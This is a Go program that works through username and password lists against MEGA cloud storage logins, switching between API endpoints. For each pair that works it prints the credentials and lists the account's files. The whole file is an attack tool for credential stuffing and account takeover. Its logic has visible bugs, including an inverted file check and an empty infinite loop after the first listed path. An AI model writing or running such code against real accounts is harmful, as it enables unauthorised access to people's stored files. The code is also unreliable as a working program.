package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strings"
	"time"

	"github.com/t3rm1n4l/go-mega"
	"github.com/t3rm1n4l/megacmd/client"
)

var (
	api = [...]string{"http://eu.api.mega.co.nz", "http://g.api.mega.co.nz"}
)

func checkFileExist(filePath string) bool {
	if _, err := os.Stat(filePath); os.IsNotExist(err) {
		return false
	} else {
		return true
	}
}

func getContent(file string) ([]string, error) {
	f, err := ioutil.ReadFile(file)
	if err != nil {
		return []string{}, fmt.Errorf("error opening file %v", err)
	}

	results := strings.Split(string(f), "\n")

	return results, nil
}

func main() {
	if checkFileExist(os.Args[0]+"username.txt") && checkFileExist(os.Args[0]+"password.txt") {
		fmt.Println("Error! File not found...!")
		os.Exit(1)
	}

	usernames, err := getContent("username.txt")
	if err != nil {
		fmt.Println(err)
		return
	}
	passwords, err := getContent("password.txt")
	if err != nil {
		fmt.Println(err)
		return
	}

	for _, u := range usernames {
		for _, p := range passwords {
		retry:
			conf := new(megaclient.Config)
			rand.Seed(time.Now().UTC().UnixNano())
			mega.API_URL = api[rand.Intn(len(api))]

			conf.User = u
			conf.Password = p

			client, err := megaclient.NewMegaClient(conf)
			if err != nil {
				fmt.Println(err)
			}

			err = client.Login()

			if err != nil {
				if err == mega.ENOENT {
					fmt.Println("Bad login "+u+":"+p, err)
					break
				} else {
					fmt.Println("Unable to establish connection to mega service", err)
					time.Sleep(time.Duration(5) * time.Second)

					goto retry
				}
			}
			fmt.Println("Good Login! " + u + ":" + p)
			paths, err := client.List("mega:/")
			if err != nil && err != mega.ENOENT {
				fmt.Println("ERROR: List failed ", err)
			}
			if err == nil {
				for _, p := range *paths {
					fmt.Println(p.GetPath())
					for {
					}
				}
			}
		}
	}

}
